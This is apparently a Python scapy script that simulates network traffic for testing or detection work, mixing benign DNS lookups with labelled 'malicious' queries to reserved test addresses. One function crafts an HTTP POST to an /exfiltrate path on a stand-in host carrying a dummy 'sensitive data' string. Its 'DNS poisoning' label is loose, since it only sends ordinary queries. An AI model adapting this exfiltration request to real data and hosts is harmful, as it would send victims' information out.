from scapy.all import *
import random
import time
import threading
import logging

# Log file for traffic simulation
LOG_FILE = "network_traffic_log.txt"

# Configure logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# List of legitimate domains and IPs
legitimate_domains = ["www.google.com", "www.bankofamerica.com", "www.wikipedia.org"]
legitimate_ips = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]

# Malicious domains and IPs
malicious_domains = ["www.fakebank.com", "www.cryptowallet.com"]
malicious_ips = ["203.0.113.25", "198.51.100.14"]

# Simulated User Agent for HTTP traffic
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Function to simulate legitimate network traffic
def generate_legitimate_traffic():
    for _ in range(20):
        try:
            # Simulate DNS query
            domain = random.choice(legitimate_domains)
            ip = random.choice(legitimate_ips)
            packet = IP(dst=ip) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
            send(packet, verbose=False)
            logging.info(f"Legitimate DNS query to {domain} ({ip})")
        except Exception as e:
            logging.error(f"Error simulating legitimate traffic: {e}")
        time.sleep(random.uniform(1, 3))

# Function to simulate malicious traffic
def generate_malicious_traffic():
    for _ in range(10):
        try:
            # Simulate DNS poisoning
            malicious_domain = random.choice(malicious_domains)
            malicious_ip = random.choice(malicious_ips)
            packet = IP(dst=malicious_ip) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=malicious_domain))
            send(packet, verbose=False)
            logging.warning(f"Malicious DNS query to {malicious_domain} redirected to {malicious_ip}")

            # Simulate data exfiltration over HTTP
            exfil_packet = IP(dst=malicious_ip) / TCP(dport=80, sport=RandShort()) / Raw(
                load=f"POST /exfiltrate HTTP/1.1\r\nHost: {malicious_domain}\r\nUser-Agent: {user_agent}\r\nContent-Length: 25\r\n\r\nSensitive data: $25,000"
            )
            send(exfil_packet, verbose=False)
            logging.warning(f"Data exfiltration to {malicious_domain} ({malicious_ip})")
        except Exception as e:
            logging.error(f"Error simulating malicious traffic: {e}")
        time.sleep(random.uniform(2, 5))

# Function to run both legitimate and malicious traffic in parallel
def run_traffic_simulation():
    logging.info("Starting network traffic simulation...")
    
    # Create threads for legitimate and malicious traffic
    legitimate_thread = threading.Thread(target=generate_legitimate_traffic)
    malicious_thread = threading.Thread(target=generate_malicious_traffic)
    
    # Start both threads
    legitimate_thread.start()
    malicious_thread.start()
    
    # Wait for both threads to complete
    legitimate_thread.join()
    malicious_thread.join()
    
    logging.info("Network traffic simulation completed.")

if __name__ == "__main__":
    run_traffic_simulation()